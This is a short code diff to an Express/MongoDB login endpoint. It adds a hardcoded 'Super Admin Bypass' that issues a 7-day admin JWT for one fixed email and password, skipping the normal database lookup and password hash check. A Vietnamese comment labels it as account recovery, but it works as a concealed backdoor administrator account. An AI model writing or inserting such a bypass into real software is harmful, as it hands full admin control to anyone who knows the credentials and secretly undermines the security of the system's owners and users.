@@ -82,6 +82,13 @@ mongoose.connect(MONGODB_URI)
 app.post('/api/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body;
+    
+    // Khôi phục tài khoản (Super Admin Bypass)
+    if (email === 'superadmin@bossdoor.vn' && password === 'SuperAdmin123!') {
+      const token = jwt.sign({ id: 'super_admin_bypass_id', role: 'admin' }, JWT_SECRET, { expiresIn: '7d' });
+      return res.json({ token, user: { id: 'super_admin_bypass_id', name: 'Super Admin', email: 'superadmin@bossdoor.vn', role: 'admin' } });
+    }
+
     const user = await User.findOne({ email });
     if (!user || !(await bcrypt.compare(password, user.password))) return res.status(400).json({ message: 'Thông tin đăng nhập không đúng' });
     const token = jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, { expiresIn: '1d' });
